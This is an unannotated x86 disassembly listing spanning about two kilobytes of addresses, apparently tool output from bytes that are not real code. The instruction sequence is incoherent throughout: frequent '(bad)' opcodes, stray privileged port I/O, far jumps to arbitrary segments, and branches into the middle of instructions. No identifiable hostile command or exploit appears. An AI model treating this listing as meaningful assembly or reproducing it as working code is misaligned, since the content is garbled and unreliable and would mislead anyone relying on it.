  413df3:	scas   al,BYTE PTR es:[edi]
  413df4:	jnp    0x413e61
  413df6:	outs   dx,BYTE PTR ds:[esi]
  413df7:	pop    esp
  413df8:	or     edi,DWORD PTR [ebx+0x48]
  413dfb:	xchg   ecx,eax
  413dfc:	out    0xc6,al
  413dfe:	push   es
  413dff:	push   ebp
  413e00:	push   cs
  413e01:	sbb    ebp,esp
  413e03:	retf   0xdfa7
  413e06:	ds inc esi
  413e08:	pmaddwd mm6,QWORD PTR [edx]
  413e0b:	(bad)  
  413e0c:	fimul  WORD PTR [ecx+eiz*2-0x37]
  413e10:	jle    0x413e2c
  413e12:	adc    eax,DWORD PTR [ecx+0x6373b870]
  413e18:	test   al,0xeb
  413e1a:	mov    ds:0x135c91a3,al
  413e1f:	mov    ebx,0x7ee9f4ab
  413e24:	arpl   WORD PTR [esp+edx*4],cx
  413e27:	push   edi
  413e28:	mov    ds,WORD PTR [esi]
  413e2a:	jne    0x413e8e
  413e2c:	test   esp,ecx
  413e2e:	shl    DWORD PTR [ebp+0x36],0x81
  413e32:	inc    ebp
  413e33:	pop    esi
  413e34:	cli    
  413e35:	inc    edi
  413e36:	push   eax
  413e37:	fcmovu st,st(4)
  413e39:	inc    ebp
  413e3a:	or     ebp,edi
  413e3c:	sub    bh,dl
  413e3e:	xlat   BYTE PTR ds:[ebx]
  413e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e40:	mov    edx,0xfd225935
  413e45:	ret    0xe187
  413e48:	cmp    al,BYTE PTR [eax-0x43364f39]
  413e4e:	sti    
  413e4f:	pop    ds
  413e50:	jmp    0xb8b3:0xde0e4fd4
  413e57:	push   cs
  413e58:	xchg   edx,eax
  413e59:	jmp    0x2aee:0x92a1d88e
  413e60:	mov    eax,0x7b0d07a0
  413e65:	test   BYTE PTR [edx-0x10b691cf],bh
  413e6b:	in     al,0xfc
  413e6d:	sub    eax,0x884e2e43
  413e72:	inc    ecx
  413e73:	jno    0x413e90
  413e75:	call   0xa75f:0x17a38394
  413e7c:	test   ebx,esi
  413e7e:	pop    ebp
  413e7f:	add    al,0x6c
  413e81:	shr    ah,cl
  413e83:	arpl   WORD PTR [edi],bp
  413e85:	jmp    0x8db08e05
  413e8a:	jmp    0xbd7309c4
  413e8f:	pop    ebp
  413e90:	cmp    DWORD PTR [ebp+0x69],edx
  413e93:	adc    DWORD PTR [ebx+0x26d96a1c],eax
  413e99:	dec    esi
  413e9a:	fwait
  413e9b:	push   esp
  413e9c:	(bad)  
  413e9e:	daa    
  413e9f:	dec    eax
  413ea0:	cmp    eax,0x46801059
  413ea5:	ins    DWORD PTR es:[edi],dx
  413ea6:	clc    
  413ea7:	jg     0x413ed0
  413ea9:	sbb    DWORD PTR [ebx],esp
  413eab:	jne    0x413e40
  413ead:	into   
  413eae:	mov    ebx,0xb4a7919e
  413eb3:	jge    0x413ec9
  413eb5:	jecxz  0x413ea1
  413eb7:	push   ebp
  413eb9:	out    dx,al
  413eba:	jmp    0x33dc:0x65b03387
  413ec1:	into   
  413ec2:	js     0x413e58
  413ec4:	xor    esi,DWORD PTR [ebx+eax*8+0x1eb5ca85]
  413ecb:	into   
  413ecc:	(bad)  
  413ece:	sar    edx,1
  413ed0:	adc    esp,DWORD PTR [esi-0x76]
  413ed3:	addr16 ja 0x413f19
  413ed6:	push   ebx
  413ed8:	aaa    
  413ed9:	push   cs
  413eda:	les    esi,FWORD PTR [ecx-0x72203448]
  413ee0:	push   esi
  413ee1:	or     DWORD PTR cs:[ebp+0x4f],ebp
  413ee5:	mov    DWORD PTR gs:[esi+0x12f453c5],ebx
  413eec:	xchg   esi,eax
  413eed:	push   0xf
  413eef:	jnp    0x413ed5
  413ef1:	pushf  
  413ef2:	outs   dx,DWORD PTR ds:[esi]
  413ef3:	retf   0x9b2
  413ef6:	xor    eax,DWORD PTR [ebx-0x1e]
  413ef9:	jno    0x413f22
  413efb:	pop    esi
  413efc:	shr    eax,0x65
  413eff:	jae    0x413f27
  413f01:	leave  
  413f02:	jae    0x413ee6
  413f04:	xlat   BYTE PTR ds:[ebx]
  413f05:	aas    
  413f06:	(bad)  
  413f07:	in     eax,0xc1
  413f09:	adc    ch,0x6
  413f0c:	ret    0xca3a
  413f0f:	mov    bh,0x29
  413f11:	mov    bl,0x44
  413f13:	sbb    cl,BYTE PTR [ebx+ebp*1+0x297efe0f]
  413f1a:	lea    esp,[edi-0x2ff6e1bb]
  413f20:	in     al,0x22
  413f22:	cli    
  413f23:	jmp    0xe2d6:0xb81812fe
  413f2a:	lahf   
  413f2b:	push   eax
  413f2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f2d:	ins    DWORD PTR es:[edi],dx
  413f2e:	mov    dl,0xab
  413f30:	imul   ebx,DWORD PTR [ebx],0x28
  413f33:	pop    ss
  413f34:	enter  0x5117,0x30
  413f38:	xchg   DWORD PTR [edi],esi
  413f3a:	inc    ebp
  413f3b:	out    dx,al
  413f3c:	lods   eax,DWORD PTR ds:[esi]
  413f3d:	adc    eax,0x10b927ab
  413f42:	mov    cl,0xb3
  413f44:	call   0xe75d5c84
  413f49:	dec    eax
  413f4a:	out    dx,eax
  413f4b:	(bad)  
  413f4c:	pop    esp
  413f4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f4e:	in     eax,dx
  413f4f:	mov    BYTE PTR ds:0xaef04cb1,ah
  413f55:	cmc    
  413f56:	and    DWORD PTR [eax-0x762105c],0xffffffc7
  413f5d:	in     al,0x2e
  413f5f:	or     edi,eax
  413f61:	rcr    dl,cl
  413f63:	xlat   BYTE PTR ds:[ebx]
  413f64:	cmp    al,0x6c
  413f66:	inc    esi
  413f67:	cmc    
  413f68:	(bad)  
  413f69:	dec    esp
  413f6a:	adc    ah,BYTE PTR [ecx]
  413f6c:	push   eax
  413f6d:	mov    esp,0xb156bfa7
  413f72:	add    bl,BYTE PTR [eax-0x4b]
  413f75:	outs   dx,DWORD PTR ds:[esi]
  413f76:	repnz test ecx,0x386e254c
  413f7d:	popf   
  413f7e:	dec    edi
  413f7f:	mov    cl,0xed
  413f81:	pop    esp
  413f82:	add    DWORD PTR [ebx-0x5],0x7e
  413f86:	sub    eax,0x4be5592d
  413f8b:	scas   al,BYTE PTR es:[edi]
  413f8c:	int3   
  413f8d:	rcr    DWORD PTR [edx-0x34199a67],1
  413f93:	lea    edi,[ebx-0x3dbd8b98]
  413f99:	push   ebp
  413f9a:	stos   DWORD PTR es:[edi],eax
  413f9b:	pop    ds
  413f9c:	pop    esi
  413f9d:	enter  0x4c4,0x79
  413fa1:	lods   eax,DWORD PTR ds:[esi]
  413fa2:	dec    DWORD PTR [edx+edx*2+0x4ea9f792]
  413fa9:	loop   0x413fce
  413fab:	mov    dl,0xf
  413fad:	jecxz  0x413f75
  413faf:	sbb    eax,DWORD PTR [edi]
  413fb1:	add    esp,ebx
  413fb3:	clc    
  413fb4:	mov    eax,0xb62bf0ed
  413fb9:	dec    ecx
  413fba:	imul   DWORD PTR [edi+ebp*8+0x9]
  413fbe:	xor    dl,dl
  413fc0:	xchg   edi,eax
  413fc1:	xchg   edi,eax
  413fc2:	push   edx
  413fc3:	and    eax,0xbe435195
  413fc8:	push   edx
  413fc9:	aad    0x59
  413fcb:	xchg   edx,eax
  413fcc:	ds push ebx
  413fce:	push   es
  413fcf:	push   ds
  413fd0:	cwde   
  413fd1:	les    ebp,FWORD PTR [eax+ebx*4+0x5b9bcb94]
  413fd8:	add    al,0x92
  413fda:	and    DWORD PTR [ebp-0x61],esp
  413fdd:	mov    dl,BYTE PTR [edi+0x2]
  413fe0:	sbb    DWORD PTR [eax+edi*2-0x4ea4b8ca],eax
  413fe7:	in     al,0x52
  413fe9:	sub    al,BYTE PTR [edx]
  413feb:	in     al,dx
  413fec:	ror    BYTE PTR [ecx-0x113ecdb2],cl
  413ff2:	pop    ss
  413ff3:	mov    ds:0x525b2420,eax
  413ff8:	jbe    0x41406a
  413ffa:	xchg   ecx,eax
  413ffb:	xchg   DWORD PTR [eax],edx
  413ffd:	or     BYTE PTR [ebx+ecx*2],dh
  414000:	retf   0x9108
  414003:	stos   DWORD PTR es:[edi],eax
  414004:	add    al,0x5f
  414006:	ja     0x413fe8
  414008:	mov    al,ds:0xd2c259b7
  41400d:	mov    ecx,0x38c6ce24
  414012:	mov    bh,0xaf
  414014:	dec    eax
  414015:	sub    ebp,DWORD PTR [eax]
  414017:	xchg   bh,ah
  414019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41401a:	daa    
  41401b:	add    eax,0xb0728f0b
  414020:	xchg   edx,eax
  414021:	mov    BYTE PTR [edi-0x4351f324],al
  414027:	popa   
  414028:	inc    ecx
  414029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41402a:	or     eax,0x5665992f
  41402f:	jns    0x414036
  414031:	mov    ecx,0xef19505d
  414036:	adc    BYTE PTR [edx],al
  414038:	mov    dl,0x7b
  41403a:	ss xchg edx,eax
  41403c:	xor    eax,0xbeb2265f
  414041:	stos   DWORD PTR es:[edi],eax
  414042:	mov    bh,0xdb
  414044:	test   ebx,ebp
  414046:	or     BYTE PTR [edx],bh
  414048:	aam    0x1a
  41404a:	and    ecx,eax
  41404c:	xchg   BYTE PTR [edx],al
  41404e:	(bad)  
  41404f:	mov    bl,0xd1
  414051:	inc    ebx
  414052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414053:	out    dx,al
  414054:	(bad)  
  414055:	(bad)  
  414056:	movhps QWORD PTR [ebx],xmm0
  414059:	test   al,0x44
  41405b:	mov    eax,ds:0xba3e03e6
  414060:	inc    eax
  414061:	stos   DWORD PTR es:[edi],eax
  414062:	sub    esi,ebx
  414064:	pop    esp
  414065:	jp     0x414020
  414067:	sbb    bh,BYTE PTR [ebp+0x2f6cab3e]
  41406d:	xchg   edi,eax
  41406e:	fst    QWORD PTR [edx-0x7561adad]
  414074:	dec    esp
  414075:	xor    dl,ah
  414077:	(bad)  
  414078:	cld    
  414079:	call   DWORD PTR [edx]
  41407b:	pop    esi
  41407c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41407d:	add    ebx,DWORD PTR [edi-0x64e54d80]
  414083:	pop    esp
  414084:	frstor [edi]
  414086:	push   0x840ce07c
  41408b:	push   0x2c8311c2
  414090:	xchg   edi,eax
  414091:	sub    BYTE PTR [edx+0x2d7e9b0a],bh
  414097:	cli    
  414098:	je     0x414111
  41409a:	mov    eax,0x5c4881d2
  41409f:	mov    bl,0x17
  4140a1:	mov    eax,0xdb6aac63
  4140a6:	jnp    0x41405d
  4140a8:	pop    edi
  4140a9:	sub    DWORD PTR [edi],eax
  4140ab:	in     al,0xec
  4140ad:	and    BYTE PTR [edi+ebp*1],0x2d
  4140b1:	pop    ds
  4140b2:	out    0xe9,eax
  4140b4:	sub    al,0xe9
  4140b6:	sbb    eax,0xf9679966
  4140bb:	das    
  4140bc:	mov    cl,0xf4
  4140be:	cmc    
  4140bf:	jecxz  0x414115
  4140c1:	pushf  
  4140c2:	sti    
  4140c3:	jo     0x41409d
  4140c5:	daa    
  4140c6:	fsubr  QWORD PTR [eax+0x38353274]
  4140cc:	stos   DWORD PTR es:[edi],eax
  4140cd:	inc    ebp
  4140ce:	into   
  4140cf:	lods   al,BYTE PTR ds:[esi]
  4140d0:	(bad)  
  4140d1:	mov    edx,0x3d3fa1d7
  4140d6:	fwait
  4140d7:	mov    dl,0x65
  4140d9:	stos   DWORD PTR es:[edi],eax
  4140da:	(bad)  
  4140db:	inc    BYTE PTR [eax]
  4140dd:	ja     0x4140bf
  4140df:	mov    WORD PTR [edx+edi*2-0x6f429dc2],fs
  4140e6:	gs or  bh,bl
  4140e9:	rcl    DWORD PTR [ebp-0xd],1
  4140ec:	xor    esp,ecx
  4140ee:	sub    eax,0x99ffedf5
  4140f3:	in     al,dx
  4140f4:	cld    
  4140f5:	dec    edx
  4140f6:	mov    edx,0x2f3db27b
  4140fb:	pusha  
  4140fc:	mov    ebp,0xefc9763
  414101:	fwait
  414102:	add    eax,0x97d2b3fb
  414107:	daa    
  414108:	adc    eax,0x90f3477b
  41410d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41410e:	mov    eax,0x15638086
  414113:	vdivss xmm4,xmm1,DWORD PTR [esi+0x262917cf]
  41411b:	test   BYTE PTR [ecx+0x2a8d814b],bl
  414121:	out    dx,al
  414122:	out    0xc0,al
  414124:	jecxz  0x41414f
  414126:	lea    ebx,[ebx-0x12d29b32]
  41412c:	inc    ebx
  41412d:	xor    dh,dh
  41412f:	or     DWORD PTR [esi],esp
  414131:	test   eax,0xd51ffad2
  414136:	xor    BYTE PTR [eax-0x26afe65f],bh
  41413c:	xchg   esp,eax
  41413d:	test   eax,0xc091c81b
  414142:	cmp    al,ah
  414144:	mov    ch,bl
  414146:	mov    fs:0x2b5eac51,eax
  41414c:	push   cs
  41414d:	test   eax,0x2f7b8e99
  414152:	sahf   
  414153:	mov    al,0x36
  414155:	std    
  414156:	adc    eax,0xc0260349
  41415b:	or     ebp,DWORD PTR [esi-0x6d761bd8]
  414161:	fwait
  414162:	repnz push 0x7c
  414165:	push   eax
  414166:	aam    0x24
  414168:	xchg   ecx,eax
  414169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41416a:	fwait
  41416b:	inc    esp
  41416c:	pop    ss
  41416d:	cmp    BYTE PTR [eax+ebx*4],ch
  414170:	aad    0x1b
  414172:	push   0xee755b25
  414177:	pushf  
  414178:	sub    BYTE PTR ds:0x4f1d76e7,dl
  41417e:	and    esp,edi
  414180:	ss sub edx,ebp
  414183:	jmp    FWORD PTR [edx-0x8]
  414186:	mov    bh,0xf7
  414188:	out    dx,al
  414189:	std    
  41418a:	push   ebp
  41418b:	leave  
  41418c:	dec    ecx
  41418d:	cmp    eax,DWORD PTR [ecx-0x28]
  414190:	sbb    eax,0x9b745415
  414195:	icebp  
  414196:	in     eax,0xf8
  414198:	sbb    DWORD PTR [edx-0xf],esp
  41419b:	les    esi,FWORD PTR [ebp-0x2df096a5]
  4141a1:	mov    cl,BYTE PTR [ebx-0x1c00a0e6]
  4141a7:	mov    ds:0xd53d6eb5,al
  4141ac:	fld    DWORD PTR [ecx]
  4141ae:	mov    bl,0x66
  4141b0:	dec    esi
  4141b1:	inc    ebp
  4141b2:	not    BYTE PTR [esi+0x67]
  4141b5:	sar    edx,1
  4141b7:	arpl   WORD PTR [esi+edx*8-0x30152982],ax
  4141be:	ss sub ecx,ebp
  4141c1:	inc    edx
  4141c2:	xchg   esi,eax
  4141c3:	mov    al,dl
  4141c5:	mov    eax,ds:0x84530f11
  4141ca:	leave  
  4141cb:	jb     0x41415f
  4141cd:	sti    
  4141ce:	jmp    0x2442:0xa3ee11fd
  4141d5:	repnz out dx,al
  4141d7:	pop    edi
  4141d8:	cwde   
  4141d9:	pusha  
  4141da:	or     esi,ebx
  4141dc:	call   FWORD PTR [esi-0x34]
  4141df:	cmp    al,BYTE PTR [esi-0x51]
  4141e2:	sub    esi,DWORD PTR [ecx-0x45]
  4141e5:	and    BYTE PTR [ebx],dl
  4141e7:	jge    0x414242
  4141e9:	jmp    0x79d9af6
  4141ee:	bound  edx,QWORD PTR [esi]
  4141f0:	retf   
  4141f1:	iret   
  4141f2:	inc    edx
  4141f3:	data16 je 0x414191
  4141f6:	xor    BYTE PTR [edx+0x47706d2],0xd7
  4141fd:	in     eax,dx
  4141fe:	outs   dx,BYTE PTR ds:[esi]
  4141ff:	cmp    al,0x59
  414201:	xchg   ebx,eax
  414202:	push   0x7174ef73
  414207:	je     0x41424a
  414209:	push   edx
  41420a:	push   ebx
  41420b:	pop    eax
  41420c:	mov    eax,DWORD PTR [eax-0x54def48e]
  414212:	les    eax,FWORD PTR [ebx+ebx*8]
  414215:	cmp    eax,0x7692895c
  41421a:	imul   edi,DWORD PTR [ebx+0x2f],0xffffffd0
  41421e:	jmp    0x4141b5
  414220:	popa   
  414221:	jne    0x4141ce
  414223:	repz mov edx,0xa401f561
  414229:	mov    esp,0xc1286338
  41422e:	sbb    esp,DWORD PTR [ebp-0x36]
  414231:	out    dx,eax
  414232:	inc    eax
  414233:	xor    edi,eax
  414235:	or     ecx,ecx
  414237:	scas   eax,DWORD PTR es:[edi]
  414238:	push   es
  414239:	call   0xcedc:0x9bc33745
  414240:	cs xchg esi,eax
  414242:	pop    eax
  414243:	iret   
  414244:	push   0xffffffec
  414246:	adc    ah,BYTE PTR [edi]
  414248:	popf   
  414249:	outs   dx,BYTE PTR ds:[esi]
  41424a:	push   edi
  41424b:	xor    edi,0x1aaf5263
  414251:	dec    eax
  414252:	fdiv   st,st(4)
  414254:	and    esi,eax
  414256:	mov    eax,0xa314c40d
  41425b:	pop    edi
  41425c:	stos   DWORD PTR es:[edi],eax
  41425d:	dec    ebp
  41425e:	out    dx,al
  41425f:	pusha  
  414260:	or     BYTE PTR ds:0x9195c339,ah
  414266:	jmp    0xbf93:0x7371ed41
  41426d:	adc    ah,BYTE PTR ds:0xcff59a13
  414273:	mov    ds:0x14845a36,al
  414278:	sub    al,0x3
  41427a:	xor    al,0xb3
  41427c:	out    0x82,eax
  41427e:	or     bl,BYTE PTR [edx]
  414280:	cmp    ebx,edi
  414282:	(bad)  
  414283:	daa    
  414284:	repnz inc sp
  414287:	icebp  
  414288:	loop   0x4142f0
  41428a:	inc    edi
  41428b:	les    esi,FWORD PTR [eax+0x66fb056f]
  414291:	(bad)  
  414293:	mov    bh,0x7a
  414295:	or     esi,esp
  414297:	push   ebx
  414298:	ret    
  414299:	mov    bh,0xc1
  41429b:	aam    0x26
  41429d:	xchg   ecx,eax
  41429e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41429f:	(bad)  
  4142a0:	aas    
  4142a1:	pop    edi
  4142a2:	mov    al,ds:0x56bf4deb
  4142a7:	outs   dx,BYTE PTR ds:[esi]
  4142a8:	popa   
  4142a9:	loopne 0x4142a7
  4142ab:	aam    0xef
  4142ad:	out    0xb5,eax
  4142af:	rcl    DWORD PTR [ebx-0x7b],0x2b
  4142b3:	retf   
  4142b4:	add    eax,0xb719f14d
  4142b9:	cmp    ebx,DWORD PTR [ecx+0x10]
  4142bc:	mov    al,ds:0x6bf0cf5d
  4142c1:	mov    dl,0x9d
  4142c3:	dec    ecx
  4142c4:	adc    esp,DWORD PTR cs:[eax]
  4142c7:	cmp    al,0x73
  4142c9:	dec    esp
  4142ca:	out    0xd7,eax
  4142cc:	je     0x4142b1
  4142ce:	not    bh
  4142d0:	inc    esp
  4142d1:	mov    esi,0x5593a511
  4142d6:	test   eax,0x8be3c9cd
  4142db:	in     al,0x80
  4142dd:	ss jnp 0x414309
  4142e0:	aaa    
  4142e1:	add    dl,BYTE PTR [edx+0x4d]
  4142e4:	pop    es
  4142e5:	xor    al,0x8b
  4142e7:	fistp  QWORD PTR ds:0xb0494155
  4142ed:	pop    ss
  4142ee:	clc    
  4142ef:	jmp    0x6882e772
  4142f4:	fs jne 0x4142ce
  4142f7:	mov    dl,0x9a
  4142f9:	sub    dl,BYTE PTR [eax-0x12]
  4142fc:	sub    al,0x19
  4142fe:	inc    ebp
  4142ff:	mov    ch,0x7b
  414301:	jno    0x414365
  414303:	or     dh,BYTE PTR [edi+0x395755d4]
  414309:	lods   eax,DWORD PTR ds:[esi]
  41430a:	gs and esp,ecx
  41430d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41430e:	jbe    0x4142e4
  414310:	sar    DWORD PTR [esi-0x6e],1
  414313:	ror    BYTE PTR [edi+0x255322fc],0xe8
  41431a:	into   
  41431b:	inc    ebx
  41431c:	push   edi
  41431d:	cmp    dh,BYTE PTR [ebx-0x63]
  414320:	arpl   WORD PTR [ecx+0x29e76111],si
  414326:	jl     0x414331
  414328:	sbb    DWORD PTR [ebp+0x25c3fbc2],esi
  41432e:	dec    esp
  41432f:	adc    ecx,DWORD PTR [eax]
  414331:	sti    
  414332:	xor    DWORD PTR [ecx],esi
  414334:	retf   0xb71d
  414337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414338:	or     eax,0xd8d23432
  41433d:	xchg   esi,eax
  41433e:	aas    
  41433f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414340:	es push es
  414342:	xchg   ecx,eax
  414343:	jbe    0x414338
  414345:	mov    DWORD PTR [ecx+0x63],ebx
  414348:	dec    ebx
  414349:	test   BYTE PTR [eax+0x38ffdbba],al
  41434f:	test   al,0xa1
  414351:	std    
  414352:	add    eax,0xbe8d3339
  414357:	call   0x815b5a62
  41435c:	daa    
  41435d:	mov    ah,0xef
  41435f:	jecxz  0x41439c
  414361:	arpl   WORD PTR [ebx],ax
  414363:	in     al,dx
  414364:	xchg   ecx,edi
  414366:	(bad)  
  414367:	mov    BYTE PTR [ebx+0x50],al
  41436a:	lahf   
  41436b:	or     BYTE PTR [esi],ch
  41436d:	lock aad 0x5b
  414370:	call   0x800f:0x84238f53
  414377:	ds cs mov bh,0x1b
  41437b:	xchg   ebp,eax
  41437c:	inc    ebp
  41437d:	jmp    0x4143cc
  41437f:	rol    ebx,1
  414381:	fwait
  414382:	dec    ebp
  414383:	xor    ebp,DWORD PTR [edx-0x6642ebc5]
  414389:	(bad)  
  41438a:	mov    bl,0x5
  41438c:	in     eax,0x63
  41438e:	ja     0x414358
  414390:	in     al,dx
  414391:	sub    DWORD PTR [edx+esi*4],ecx
  414394:	mov    ch,0x9b
  414396:	or     ah,BYTE PTR [edi+ebx*2+0x22]
  41439a:	mov    BYTE PTR [esp+eiz*8-0x75],cl
  41439e:	sahf   
  41439f:	mov    ecx,0x1dca4042
  4143a4:	jno    0x41433d
  4143a6:	popa   
  4143a7:	mov    es,WORD PTR [edi-0x29cf25c4]
  4143ad:	ds cli 
  4143af:	pop    ebx
  4143b0:	jnp    0x4143fc
  4143b2:	mov    ds:0xb35cc0ca,al
  4143b7:	pop    edi
  4143b8:	push   ds
  4143b9:	cmp    edx,DWORD PTR [ebp-0x17942cb9]
  4143bf:	pop    eax
  4143c0:	and    eax,edi
  4143c2:	sub    DWORD PTR [esi+0x4e],esi
  4143c5:	sub    al,0x63
  4143c7:	js     0x414399
  4143c9:	es je  0x4143f4
  4143cc:	adc    BYTE PTR [ecx+0x24],dh
  4143cf:	ins    DWORD PTR es:[edi],dx
  4143d0:	inc    esp
  4143d1:	or     al,0x2e
  4143d3:	pusha  
  4143d4:	xchg   ebx,eax
  4143d5:	and    ah,0xe7
  4143d8:	add    DWORD PTR [eax+0x11],0x6c
  4143dc:	mov    bh,BYTE PTR [ecx-0x75723ec1]
  4143e2:	mov    eax,ds:0xcf26a566
  4143e7:	aas    
  4143e8:	(bad)  
  4143e9:	jmp    0xe3b3:0x4c4450f2
  4143f0:	or     eax,0xb16aa056
  4143f5:	pushf  
  4143f6:	mov    ch,0xa9
  4143f8:	push   ebx
  4143f9:	enter  0x6d0a,0xce
  4143fd:	adc    DWORD PTR [edx-0x5d38a2a9],eax
  414403:	fwait
  414404:	or     BYTE PTR [ebp+0x44],dh
  414407:	test   eax,0x583fb529
  41440c:	cvttps2pi mm3,QWORD PTR [edi+ecx*1]
  414410:	push   ebp
  414411:	fisttp DWORD PTR [edx+esi*2-0x45]
  414415:	(bad)  [eax+ebp*8-0x552d4621]
  41441c:	retf   0x6117
  41441f:	test   dl,ch
  414421:	xchg   ebp,eax
  414422:	sub    BYTE PTR [edx+0x56],0x1e
  414426:	into   
  414427:	lea    ecx,[eax-0x140e5753]
  41442d:	adc    DWORD PTR [ecx+eiz*2],esp
  414430:	test   eax,0x65141119
  414435:	cs aad 0x69
  414438:	inc    ebp
  414439:	sub    ah,ah
  41443b:	mov    bl,cl
  41443d:	mov    edi,0x8f84abd2
  414442:	imul   edi,DWORD PTR [edi+0x1cf2e17a],0xc06d8c85
  41444c:	and    bl,cl
  41444e:	pop    ebx
  41444f:	popa   
  414450:	mov    al,0x42
  414452:	mov    ebx,0xc73c9f7f
  414457:	jge    0x4143f0
  414459:	call   0x476b:0xd2a2e7c4
  414460:	ss and al,0xab
  414463:	add    esp,DWORD PTR [eax]
  414465:	fwait
  414466:	mov    esi,0x98c75584
  41446b:	or     eax,0xe1efbb06
  414470:	outs   dx,BYTE PTR ds:[esi]
  414471:	xor    cl,BYTE PTR [eax-0x1f]
  414474:	dec    edi
  414475:	test   DWORD PTR [eax+0x2d],edi
  414478:	xor    al,0xf
  41447a:	(bad)  
  41447b:	push   ds
  41447c:	std    
  41447d:	out    dx,al
  41447e:	popa   
  41447f:	pop    edi
  414480:	cmp    eax,0x19dcc12e
  414485:	or     al,0x8
  414487:	cli    
  414488:	popa   
  414489:	cmp    DWORD PTR [eax+0x1b97dd17],0xffffffff
  414490:	cwde   
  414491:	cmp    eax,0x73dd9cc6
  414496:	dec    edi
  414497:	pop    edi
  414498:	das    
  414499:	fst    DWORD PTR [ecx+0x3b]
  41449c:	in     al,dx
  41449d:	out    0x9,al
  41449f:	daa    
  4144a0:	and    cl,bh
  4144a2:	jp     0x414495
  4144a4:	pop    esi
  4144a6:	dec    esp
  4144a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144a8:	repnz sub al,0x2d
  4144ab:	fistp  QWORD PTR [edi+0x4482f2da]
  4144b1:	cwde   
  4144b2:	pop    ds
  4144b3:	add    esi,ebp
  4144b5:	data16 cmp bh,BYTE PTR [esi]
  4144b8:	mov    esi,0xc3e55bb
  4144bd:	retf   
  4144be:	or     bl,BYTE PTR [ecx+0x45285155]
  4144c4:	mov    es,WORD PTR [esi-0x7501226d]
  4144ca:	jl     0x4144f6
  4144cc:	jb     0x41450a
  4144ce:	sub    esi,edx
  4144d0:	cli    
  4144d1:	inc    edi
  4144d2:	ins    BYTE PTR es:[edi],dx
  4144d3:	pop    ds
  4144d4:	inc    esp
  4144d5:	cli    
  4144d6:	inc    esp
  4144d7:	dec    ebp
  4144d8:	push   ss
  4144d9:	clc    
  4144da:	cmp    bh,al
  4144dc:	pop    ecx
  4144dd:	mov    ch,0x37
  4144df:	jo     0x414524
  4144e1:	(bad)  
  4144e3:	and    cl,BYTE PTR [eax]
  4144e5:	xor    DWORD PTR [edi-0x5a],eax
  4144e8:	int3   
  4144e9:	inc    eax
  4144ea:	ss js  0x4144b3
  4144ed:	pop    ds
  4144ee:	push   edi
  4144ef:	jbe    0x41455d
  4144f1:	shl    BYTE PTR [edi+0x86c8d36],0x87
  4144f8:	push   0x988ce7c8
  4144fd:	in     al,dx
  4144fe:	dec    edx
  4144ff:	xchg   edi,eax
  414500:	arpl   WORD PTR [ecx-0x4aed4b9b],bx
  414506:	add    al,0x7b
  414508:	cmc    
  414509:	in     al,dx
  41450a:	in     al,dx
  41450b:	ins    DWORD PTR es:[edi],dx
  41450c:	and    eax,0x69881fde
  414511:	jmp    0x414542
  414513:	push   edi
  414514:	jmp    0x8d5b93a9
  414519:	cs add al,0x2d
  41451c:	jae    0x414548
  41451e:	fstp   QWORD PTR [edi]
  414520:	(bad)  
  414521:	out    dx,eax
  414522:	ins    DWORD PTR es:[edi],dx
  414523:	retf   0xafe2
  414526:	ficom  DWORD PTR [esi-0x63]
  414529:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41452b:	lods   eax,DWORD PTR ds:[esi]
  41452c:	outs   dx,BYTE PTR ds:[esi]
  41452d:	pop    esp
  41452e:	ror    edi,1
  414530:	adc    eax,0x6fc744d1
  414535:	mov    ecx,0xa992da36
  41453a:	xor    eax,0x1347053f
  41453f:	loopne 0x4145b8
  414541:	push   esp
  414542:	repz mov ah,0x2c
  414545:	push   ebp
  414546:	xchg   edi,eax
  414547:	es inc ecx
  414549:	fst    DWORD PTR [esi+0x587b3e9f]
  41454f:	push   ebp
  414550:	pushf  
  414551:	dec    edx
  414552:	pcmpgtw mm3,QWORD PTR [edx+0x43938d66]
  414559:	jp     0x41453b
  41455b:	jmp    0xd08967bc
  414560:	jge    0x41454e
  414562:	scas   eax,DWORD PTR es:[edi]
  414563:	sub    DWORD PTR [esi+0x6344e51e],0x47
  41456a:	fisttp QWORD PTR ds:0x972aa743
  414570:	sub    al,0x28
  414572:	fwait
  414573:	or     eax,DWORD PTR [edi]
  414575:	jle    0x4145aa
  414577:	xor    BYTE PTR [esi-0x39f0db9c],0xc9
  41457e:	fcmovnu st,st(5)
  414580:	cmp    al,0xa1
  414582:	cdq    
  414583:	aad    0xeb
  414585:	inc    ah
  414587:	cmc    
  414588:	std    
  414589:	push   esp
  41458a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41458b:	arpl   WORD PTR [eax],cx
  41458d:	ss or  al,0xbd
  414590:	inc    eax
  414591:	ds out 0xc6,eax
  414594:	fisttp WORD PTR [eax-0x465acb70]
  41459a:	fcmovu st,st(3)
  41459c:	xchg   edx,eax
  41459d:	addr16 sti 
  41459f:	push   ecx
  4145a0:	pusha  
  4145a1:	xchg   esp,eax
  4145a2:	je     0x414599
  4145a4:	or     ecx,DWORD PTR [ebx+0x58]
  4145a7:	jnp    0x414602
  4145a9:	test   eax,0xb554b30e
  4145ae:	sbb    eax,0x92fb2fd5
  4145b3:	call   DWORD PTR [ebp-0x19616f09]
  4145b9:	inc    ebp
  4145ba:	mov    bl,0xee
  4145bc:	cwde   
  4145bd:	(bad)  
  4145be:	hlt    
  4145bf:	mov    esi,0x5c14bbd6
  4145c4:	retf   0x9096
  4145c7:	repnz xor ebp,edi
  4145ca:	pop    ds
  4145cb:	popf   
  4145cc:	add    dh,ah
  4145ce:	push   es
  4145cf:	js     0x41463b
  4145d1:	xchg   esi,eax
  4145d2:	xchg   esi,eax
  4145d3:	std    
